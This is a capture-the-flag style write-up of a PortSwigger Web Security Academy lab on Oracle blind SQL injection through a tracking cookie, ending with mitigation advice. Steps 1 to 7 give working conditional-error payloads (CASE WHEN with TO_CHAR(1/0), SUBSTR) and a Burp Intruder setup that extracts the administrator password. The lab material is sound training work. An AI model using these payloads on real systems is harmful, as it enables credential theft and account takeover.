# Lab 12: Blind SQL Injection with Conditional Errors

## Platform
PortSwigger Web Security Academy

## Difficulty
Practitioner

## Vulnerability Type
Blind SQL Injection (Conditional Error-Based)

---

## Lab Description

This lab demonstrates **blind SQL injection with conditional errors**.  
Unlike previous blind SQL injection labs, **the application response does not change** based on injected conditions. Instead, **a custom error message is returned only when the SQL query causes a database error**.

The vulnerability exists in the **TrackingId cookie**, which is used unsafely in backend SQL queries.

---

## Root Cause

- User-controlled `TrackingId` cookie is concatenated directly into an SQL query
- No input validation or parameterized queries
- Application leaks information via **error vs no-error behavior**

---

## Exploitation Overview

- Identify SQL injection in the `TrackingId` cookie
- Use **Oracle-specific syntax**
- Trigger database errors **only when injected conditions are true**
- Use error presence as a **TRUE/FALSE signal**
- Extract administrator password using **CASE + TO_CHAR(1/0)** logic

---

## Step-by-Step Exploitation

### 1. Confirm SQL Injection

Add a single quote to the TrackingId:
TrackingId=xyz'


- Causes application error → injection confirmed

Double quote:


TrackingId=xyz"


- No error → confirms SQL context

---

### 2. Test SQL Query Execution (Oracle)

```sql
' || (SELECT '' FROM dual) || '


Returns 200 → SQL injection works

dual is used because Oracle requires a FROM clause

---

### 3. Confirm users Table Exists
' || (SELECT '' FROM users WHERE rownum=1) || '


Returns 200 → users table exists
---
### 4. Check if Administrator User Exists (Conditional Error)
' || (
SELECT CASE 
WHEN (1=1) THEN TO_CHAR(1/0) 
ELSE '' 
END 
FROM users 
WHERE username='administrator'
) || '


Error occurs → administrator user exists
---
### 5. Determine Password Length
' || (
SELECT CASE 
WHEN (1=1) THEN TO_CHAR(1/0) 
ELSE '' 
END 
FROM users 
WHERE username='administrator' 
AND LENGTH(password)=20
) || '


Error → password length is 20
---
### 6. Extract Password Characters
' || (
SELECT CASE 
WHEN (1=1) THEN TO_CHAR(1/0) 
ELSE '' 
END 
FROM users 
WHERE username='administrator' 
AND SUBSTR(password,1,1)='a'
) || '


Uses SUBSTR() (Oracle-specific)

Error → correct character

No error → incorrect character
---
### 7. Automate with Burp Intruder

-Attack type: Cluster Bomb
-Payload 1: Position index (1–20)
-Payload 2: Characters (a–z, 0–9)
-Filter responses by HTTP 5xx
-Collect characters and reconstruct password

---
### 8. Login as Administrator
-Username: administrator
-Password: extracted value
-Lab solved successfully
-Why This Works
-Database errors act as a boolean oracle
-CASE WHEN forces an error only if conditions are met
-Error vs no-error reveals sensitive data without visible output

---
## Impact

Administrator account takeover

Exposure of sensitive data

Full authentication bypass

---

## Mitigation

- Use prepared / parameterized queries
- Do not use cookies directly in SQL queries
- Suppress database error messages
- Apply least-privilege database access

---
## Tools Used

Burp Suite (Repeater, Intruder)